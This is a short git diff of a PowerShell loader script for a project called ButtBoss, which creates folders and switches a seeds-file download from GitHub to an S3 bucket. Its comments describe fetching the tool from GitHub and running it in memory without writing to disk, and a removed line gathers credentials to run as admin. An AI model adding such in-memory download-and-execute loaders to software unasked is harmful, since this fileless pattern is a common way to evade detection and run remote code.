@@ -1,12 +1,9 @@
-# House keeping script that downloads current version of buttboss from github and executes in memory instead of downloading to disk 
-
-# Get creds to run as admin / warn a scrub 
-Get-Credentials
+# Loader script
 
 # Create goofin/butts goofin/cuts and the seeds for grand plan
 Mkdir "C:\Goofin\butts"
 Mkdir "C:\Goofin\cuts" 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mellonaut/ButtBoss/main/buttseeds.txt" -O "C:\Goofin\butts\buttseeds.txt"
+Invoke-WebRequest -Uri "https://buttboss.s3.us-east-1.amazonaws.com/buttseeds.txt" -O "C:\Goofin\buttseeds.txt"
 
 
 # Grab buttboss from github and execute in memory
